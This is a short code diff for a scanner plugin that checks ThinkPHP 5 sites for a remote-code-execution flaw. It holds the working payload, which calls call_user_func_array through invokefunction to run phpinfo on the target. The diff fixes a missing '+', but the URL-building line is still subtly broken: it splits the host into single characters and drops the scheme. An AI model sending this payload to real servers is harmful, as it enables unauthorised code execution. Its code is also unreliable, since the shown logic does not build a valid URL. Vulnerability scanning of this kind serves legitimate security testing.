@@ -18,7 +18,7 @@ class thinkphp_v5_rce(BaseWebPlugin):
 
     def verify(self,web, user='', pwd='',timeout=10):
         try:
-            url = '/'.join(web.url.split('/')[2]) "/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+            url = '/'.join(web.url.split('/')[2]) + "/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
             response = requests.get(url).text
             if "PHP Version" in response and "PHP License" not in response:
                 self.bugaddr = url
